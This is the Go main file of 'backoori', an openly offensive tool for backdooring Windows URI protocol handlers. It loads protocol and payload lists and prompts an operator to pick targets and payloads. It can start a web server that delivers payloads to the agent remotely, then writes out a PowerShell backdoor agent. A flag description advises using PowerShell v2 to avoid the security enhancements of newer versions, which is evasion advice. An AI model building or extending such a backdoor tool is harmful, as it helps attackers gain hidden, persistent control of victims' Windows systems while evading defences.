package main

import (
	"flag"
	"github.com/giuliocomi/backoori/cli"
	"github.com/giuliocomi/backoori/crafter"
	"github.com/giuliocomi/backoori/deliverer"
	"github.com/giuliocomi/backoori/ingestor"
	"net"
	"os"
)

const version = "0.92"

var (
	isHelpNeeded          = flag.Bool("help", false, "Display help details")
	jsonURIprotocols      = flag.String("protocols", "./resources/uri_protocols_sample.json", "Provide the JSON filename containing the URI protocols to backdoor on the target system")
	jsonPayloads          = flag.String("payloads", "./resources/payloads_sample.json", "Provide the JSON filename containing the payloads to use in the backdoored gadgets")
	isOnlinePayloadString = flag.String("online", "false", "Provide 'true' if wants agent to fetch the payloads via the webserver, 'false' otherwise to store the payloads directly in the agent PS agent")
	powershellVersion     = flag.Int("ps-version", 3, "Provide the Powershell version that the agent will use for the payloads (recommended v2 for avoiding security enhancements of recent versions)")
	gadgetList            []crafter.GadgetItem
	chosenPayload         ingestor.Payload
	listeningIp           string
	httpPort, timeout     int
)

func main() {
	flag.Parse()
	// help
	cli.HelpMenu(version)
	if *isHelpNeeded || !flag.Parsed() || flag.NFlag() == 0 {
		flag.PrintDefaults()
		os.Exit(1)
	}
	// start web server
	isOnlinePayload := cli.FlagDialog(*isOnlinePayloadString)
	if isOnlinePayload {
		listeningIp, httpPort, timeout = cli.WebServerDialog()
		go deliverer.SetupWebServer(net.ParseIP(listeningIp), httpPort)
	}

	uriList, availablePayloads := ingestor.LoadResources(*jsonURIprotocols, *jsonPayloads)
	// menu
	for {
		uriEntry := uriList.UriList[cli.UriToBackdoorDialog(uriList)]
		chosenPayload = availablePayloads.Payloads[cli.PayloadDialog(availablePayloads)]
		chosenPayloadWithParams := cli.ParamsDialog(chosenPayload)

		if isOnlinePayload {
			chosenPayloadWithParams.UniqueId = ingestor.DeployCradleGadgetPayload(chosenPayloadWithParams) //important info is UniqueID
		}
		gadgetList = append(gadgetList, crafter.GadgetItem{UriEntry: uriEntry, Payload: chosenPayloadWithParams}) //contains info about payload and its name
		if !cli.ChooseAnotherUriToBackdoorDialog() {
			break
		}
	}
	// Going to write payload agent to file
	crafter.OutputAgent(listeningIp, httpPort, *powershellVersion, isOnlinePayload, gadgetList)
	cli.OnExitDialog(isOnlinePayload, listeningIp, httpPort, timeout)
}
